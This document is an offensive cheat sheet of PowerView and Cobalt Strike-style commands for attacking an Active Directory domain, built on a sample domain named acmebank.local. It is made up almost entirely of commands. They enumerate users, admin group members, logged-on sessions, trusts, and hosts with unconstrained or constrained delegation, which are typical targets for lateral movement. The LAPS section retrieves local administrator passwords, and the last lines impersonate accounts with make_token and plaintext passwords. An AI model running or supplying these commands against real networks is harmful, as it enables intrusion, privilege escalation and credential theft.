### Get list of users in the current Domain

```
powershell Get-NetUser | select cn
powershell Get-NetUser -Identity John
powershell Get-NetUser -Identity John | select msexchhomeservername,userprincipalname,primarygroupid,homedrive,homedirectory | fl
powershell Get-NetUser | select userprincipalname,userprincipalname,homedirectory,serviceprincipalname
powershell Get-NetUser | Format-Table name, samaccountname, userprincipalname, description
powershell Get-NetUser -Credential $Cred | Format-Table name, samaccountname, userprincipalname, description
```
### DomainComputer
```
powershell Get-DomainComputer -Properties DnsHostName | Sort-Object -Property DnsHostName
powershell Get-DomainComputer | select cn,objectsid,dnshostname
PowerShell Find-DomainUserLocation | Select-Object UserName, SessionFromName # Identify Each user Sesson On Network
PowerShell Get-DomainComputer -Properties DnsHostName | Sort-Object -Property DnsHostName
powershell Get-NetComputer -OperatingSystem "*Server 2016*" | select operatingsystem,lastlogon,dnshostname
```

### Figure out The Domain Administator GroupMember
```
powershell Get-DomainGroup *admin* -Properties samaccountname | Get-DomainGroupMember | select MemberDomain,GroupName,MemberName
powershell Get-DomainGroupMember -identity *admin* -recurse | select -exp membername
powershell Get-DomainGroup *admin* -Properties samaccountname | Get-DomainGroupMember | select MemberDomain,GroupName,MemberName | fl
```
### Unconstrained Delegation
```
powershell Get-DomainComputer -Unconstrained | select -exp dnshostname
powershell Get-DomainComputer -Unconstrained | select samaccountname,dnshostname,operatingsystem,useraccountcontrol
powershell Get-DomainComputer -Unconstrained | select samaccountname,dnshostname,useraccountcontrol,dnshostname,operatingsystem
powershell Get-DomainGroupMember -identity *admin* -recurse | select -exp membername
powershell Find-DomainUserLocation -userIdentity <> 
powershell Get-DomainGPOLocalGroup | select GroupName,GPODisplayName,GPOType,GPOName
powershell Get-DomainOU -GPLink '{The value of GOP ID }' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}
powershell Get-DomainOU -GPLink '{The value of GOP ID}' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}
powershell Get-DomainOU -GPLink '{The value of GOP ID}' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}
```
### Constrained Delegation
```
Get-NetUser -TrustedToAuth
powershell Get-DomainComputer -TrustedToAuth | select -exp dnshostname 
powerpick Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto,useraccountcontrol
powershell Get-DomainComputer -TrustedToAuth -Properties distinguishedname,msds-allowedtodelegateto,useraccountcontrol -Verbose | fl 
powershell Get-DomainComputer <> | select -exp msds-AllowedToDelegateTo #To find what services it could delegate for
powershell Get-NetComputer <> | select name, msds-allowedtodelegateto, useraccountcontrol | fl
powershell Get-NetComputer <> | Select-Object -ExpandProperty msds-allowedtodelegateto | fl
```
### DomainGPO
```
powershell Get-DomainGPOLocalGroup
powershell Get-DomainGroupMember -identity 'Workstation Admins' -recurse | select -exp membername 
powershell Get-DomainGroupMember -identity 'Helpdesk\Admins' -recurse | select -exp membername 
powershell Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName
powershell Get-DomainGPO -ComputerIdentity <> -Properties DisplayName | Sort-Object -Property DisplayName
powershell Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
```

### Organization Units
```
 powershell Get-DomainOU -Properties Name | Sort-Object -Property Name
 
```
### DomainGPOLocalGroup

```
powershell Get-DomainGPOLocalGroup
powershell Get-DomainGroupMember -identity 'Workstation Admins' -recurse | select -exp membername 
powershell Get-DomainGroupMember -identity 'Helpdesk\Admins' -recurse | select -exp membername  
powershell Find-DomainUserLocation -userIdentity 'Workstation\Admins' 
PowerShell Get-DomainGroup -Identity 'Domain Admins' | Select-Object -ExpandProperty Member
PowerShell Get-DomainGroupMember -Identity 'Domain Admins' | Select-Object MemberDistinguishedName 
PowerShell Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
PowerShell Find-DomainUserLocation | Select-Object UserName, SessionFromName

```
### NetLocalGroupMember
```
powershell Get-NetLocalGroup | Select-Object GroupName
powershell Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain
powershell Get-NetLoggedOn


```
### Net Session
```
powershell Get-NetSession -ComputerName fs-1 | Select-Object CName, UserName
```

### Domain Group Members Enumeration
```
To enumerate members of the Domain Admins group
powershell Get-DomainGroup *admin* -Properties samaccountname | Get-DomainGroupMember  | select -ExpandProperty GroupName
powershell Get-DomainGroupMember "Domain Admins"
powershell Get-DomainGroupMember  "Enterprise Admins"
powershell Get-DomainGroupMember "Enterprise Admins" –Domain acmebank.local
powershell Get-DomainGroup *admin* -Properties samaccountname | Get-DomainGroupMember
```
### DomainPolicy
```
Get-Domain | Select-Object -Expand name
Get-DomainPolicy  -Domain acmebank.local
powershell Get-DomainPolicy -Source DC -Domain acmebank.local
```
### Forest Manipulation and abusive

```
#Get a list of all Domain Trusts for the current Domain
powershell Get-NetDomainTrust
powershell Get-NetDomainTrust -Domain <domain>

#Get details about the current Forest
powershell Get-NetForest
powershell powershell Get-NetForest -Forest  acmebank.local

#Get all Domains in the current Forest
powershell Get-NetForestDomain
powershell Get-NetForestDomain -Forest acmebank.local
```
#### LAPS 
```
powershell Get-DomainGPO -Identity "*LAPS*"
powershell-import C:\Users\Commando\Desktop\Weapon\LAPSToolkit.ps1
powershell Get-LAPSComputers 
powershell Find-LAPSDelegatedGroups
powershell Get-Command *AdmPwd*
powershell Get-AdmPwdPassword -ComputerName <> | fl
make_token MeMe 123456qWE
make_token insomnia.io\MeMe 123456qWE

```

